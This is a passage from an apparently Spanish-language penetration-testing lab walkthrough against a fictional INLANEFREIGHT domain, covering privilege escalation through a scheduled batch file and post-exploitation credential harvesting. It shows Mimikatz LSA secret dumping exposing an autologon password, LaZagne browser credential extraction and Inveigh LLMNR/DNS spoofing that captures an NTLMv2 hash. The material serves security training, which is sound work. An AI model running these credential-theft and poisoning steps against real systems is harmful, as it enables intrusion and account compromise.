- Marca `Run task if a file is added to the monitor folder or subfolder(s)`
- Elige `Run any other Program` y elige `C:\Users\ilfserveradm\Documents\pwn.bat`
- Desmarca `Login as the following user to run task`
- Haz clic en `Finish` y luego en `Save`

Finalmente, para activar la tarea, crea un nuevo archivo .txt en el directorio `C:\Users\ilfserveradm\Documents`. Podemos verificar y ver que el usuario `ilfserveradm` fue agregado al grupo `Administrators`.

  Share Hunting

```r
C:\Users\ilfserveradm> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
ilfserveradm
INLANEFREIGHT\Domain Admins
The command completed successfully.
```

---

## Post-Exploitation/Pillaging

A continuación, realizaremos algunas actividades de post-explotación en el host MS01. Vemos un par de archivos interesantes en la raíz del disco c:\ llamados `budget_data.xlsx` y `Inlanefreight.kdbx` que valdría la pena revisar y potencialmente informar al cliente si no están en su ubicación prevista. Luego, podemos usar Mimikatz, elevar a un token `NT AUTHORITY\SYSTEM` y volcar secretos de LSA.

  Share Hunting

```r
c:\Users\ilfserveradm\Documents> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::secrets
Domain : ACADEMY-AEN-MS0
SysKey : 61b3d49a6205a1dedb14591c22d36afc
ERROR kuhl_m_lsadump_secretsOrCache ; kull_m_registry_RegOpenKeyEx (SECURITY) (0x00000005)

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

564     {0;000003e7} 1 D 30073          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0136075a} 2 F 20322234    ACADEMY-AEN-MS0\ilfserveradm    S-1-5-21-1020326033-369054202-3290056218-1002   (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 20387820    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::secrets
Domain : ACADEMY-AEN-MS0
SysKey : 61b3d49a6205a1dedb14591c22d36afc

Local name : ACADEMY-AEN-MS0 ( S-1-5-21-1020326033-369054202-3290056218 )
Domain name : INLANEFREIGHT ( S-1-5-21-2814148634-3729814499-1637837074 )
Domain FQDN : INLANEFREIGHT.LOCAL

Policy subsystem is : 1.18
LSA Key(s) : 1, default {13764b01-b89c-8adf-69ec-8937ee43821e}
  [00] {13764b01-b89c-8adf-69ec-8937ee43821e} 587be7dcfb75bb9ebb0c5c75cf4afb4488e602f9926f3404a09ecf8ba20b04e7

Secret  : $MACHINE.ACC
cur/text: -2d"GC)[+6,[+mC+UC5KXVoH>j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(<7tZW"I\7`,Bu#]N$'%A`$Z?E@9V2zdh=
    NTLM:ced50a6f3cb256110200dcb022b32c12
    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8
old/text: -2d"GC)[+6,[+mC+UC5KXVoH>j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(<7tZW"I\7`,Bu#]N$'%A`$Z?E@9V2zdh=
    NTLM:ced50a6f3cb256110200dcb022b32c12
    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8

Secret  : DefaultPassword
cur/text: DBAilfreight1!

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 37 62 35 26 80 4c 6b 2f 11 ca 06 25 ab 97 21 3f 84 f8 74 fa bc 69 a1 c4 37 2b df f8 cd 6c 8f 0a 8a d9 67 e9 42 cf 4f 96
    full: 37623526804c6b2f11ca0625ab97213f84f874fabc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
    m/u : 37623526804c6b2f11ca0625ab97213f84f874fa / bc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
old/hex : 01 00 00 00 51 9c 86 b4 cb dc 97 8b 35 9b c0 39 17 34 16 62 31 98 c1 07 ce 7d 9f 94 fc e7 2c d9 59 8a c6 07 10 78 7c 0d 9a 56 ce 0b
    full: 519c86b4cbdc978b359bc039173416623198c107ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
    m/u : 519c86b4cbdc978b359bc039173416623198c107 / ce7d9f94fce72cd9598ac60710787c0d9a56ce0b

Secret  : NL$KM
cur/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
old/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
```

Encontramos una contraseña configurada pero sin nombre de usuario asociado. Esto parece ser para una cuenta configurada con autologon, así que podemos consultar el Registro para encontrar el nombre de usuario.

  Share Hunting

```r
PS C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"

DefaultUserName : mssqladm
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
                  NT\CurrentVersion\Winlogon\
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
PSChildName     : Winlogon
PSDrive         : HKLM
PSProvider      : Microsoft.PowerShell.Core\Registry
```

Ahora tenemos un nuevo par de credenciales: `mssqladm:DBAilfreight1!`.

Antes de seguir, verifiquemos si hay otras credenciales. Vemos que Firefox está instalado, así que podemos usar la herramienta [LaZagne](https://github.com/AlessandroZ/LaZagne) para intentar volcar cualquier credencial guardada en el navegador. No tuvimos suerte, pero siempre vale la pena intentarlo.

  Share Hunting

```r
c:\Users\ilfserveradm\Documents> lazagne.exe browsers -firefox

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for 6f898230-c272-4f85-875c-9f7b354ce485
[+] System masterkey decrypted for 9ccbb5e8-66c9-4210-a46c-a72e8f750734
[+] System masterkey decrypted for 08ed962e-44d9-4e2c-9985-392b699c25ae
[+] System masterkey decrypted for d4bfcc8b-5eec-485d-8adb-9ed4ae5656d6

[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.29700016975
```

También vale la pena ejecutar [Inveigh](https://github.com/Kevin-Robertson/Inveigh) una vez que tengamos administrador local en un host para ver si podemos obtener hashes de contraseña para cualquier usuario.

  Share Hunting

```r
PS C:\Users\ilfserveradm\Documents> Import-Module .\Inveigh.ps1
PS C:\Users\ilfserveradm\Documents> Invoke-Inveigh -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-06-22T15:03:32
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.8.50
[+] Spoofer IP Address = 172.16.8.50
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer = Disabled
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Users\ilfserveradm\Documents
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
[+] [2022-06-22T15:04:05] TCP(445) SYN packet detected from 172.16.8.20:55623
[+] [2022-06-22T15:04:05] SMB(445) negotiation request detected from 172.16.8.20:55623
[+] [2022-06-22T15:04:05] Domain mapping added for INLANEFREIGHT to INLANEFREIGHT.LOCAL
[+] [2022-06-22T15:04:05] SMB(445) NTLM challenge 5EB0B310E7B8BA04 sent to 172.16.8.20:55623
[+] [2022-06-22T15:04:05] SMB(445) NTLMv2 captured for ACADEMY-AEN-DEV\mpalledorous from 172.16.8.20(ACADEMY-AEN-DEV):55623:
mpalledorous::ACADEMY-AEN-DEV:5EB0B310E7B8BA04:<SNIP>
```

---

## Closing In

Ahora hemos enumerado el dominio por dentro y por fuera, nos hemos movido lateralmente y saqueado lo que pudimos encontrar en los hosts objetivo. En este punto, tenemos credenciales para el usuario `mssqladm` y podemos continuar buscando un camino hacia el compromiso del dominio.